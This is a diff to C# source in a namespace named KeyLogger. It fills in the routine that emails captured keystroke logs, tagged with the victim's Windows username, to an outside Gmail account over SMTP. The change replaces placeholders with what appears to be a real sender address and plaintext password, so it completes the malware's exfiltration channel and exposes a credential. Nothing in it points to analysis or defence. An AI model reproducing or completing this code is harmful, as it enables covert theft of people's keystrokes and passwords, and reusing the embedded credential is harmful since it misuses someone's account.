@@ -167,8 +167,8 @@ namespace KeyLogger
                 MailMessage mail = new MailMessage();
                 SmtpClient server = new SmtpClient("smtp.gmail.com");
 
-                mail.From = new MailAddress("email");
-                mail.To.Add("dest");
+                mail.From = new MailAddress("botsepeti@gmail.com");
+                mail.To.Add("botsepeti@gmail.com");
                 mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name;
 
                 if (!File.Exists(path)) return;
@@ -179,7 +179,7 @@ namespace KeyLogger
                 mail.Body = content;
 
                 server.Port = 587;
-                server.Credentials = new NetworkCredential("email", "password");
+                server.Credentials = new NetworkCredential("botsepeti@gmail.com", "#lJ9WvqX");
                 server.EnableSsl = true;
                 server.Send(mail);
             }
